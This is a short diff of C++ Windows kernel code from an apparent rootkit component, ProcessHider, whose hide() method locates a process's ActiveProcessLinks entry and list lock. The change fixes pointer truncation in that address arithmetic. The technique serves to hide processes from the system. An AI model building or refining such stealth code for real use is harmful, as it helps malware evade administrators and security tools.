@@ -6,10 +6,10 @@ ProcessHider::ProcessHider(Process& process)
 {}
 
 NTSTATUS ProcessHider::hide() {
-    const auto activeProcessLinksAddress = reinterpret_cast<ULONG_PTR>(ULongToPtr(HandleToUlong(m_process.get()) + static_cast<ULONG>(Offsets::activeProcessLinks)));
+    const auto activeProcessLinksAddress = reinterpret_cast<ULONG_PTR>(m_process.get()) + static_cast<ULONG>(Offsets::activeProcessLinks);
     const auto processListEntry = reinterpret_cast<PLIST_ENTRY>(activeProcessLinksAddress);
 
-    const auto processListLockAddress = reinterpret_cast<ULONG_PTR>(ULongToPtr(HandleToUlong(m_process.get()) + static_cast<ULONG>(Offsets::processLock)));
+    const auto processListLockAddress = reinterpret_cast<ULONG_PTR>(m_process.get()) + static_cast<ULONG>(Offsets::processLock);
 
     // Using the ActiveProcessLinks lock to avoid accessing problems.
     const auto listLock = reinterpret_cast<PEX_PUSH_LOCK>(processListLockAddress);
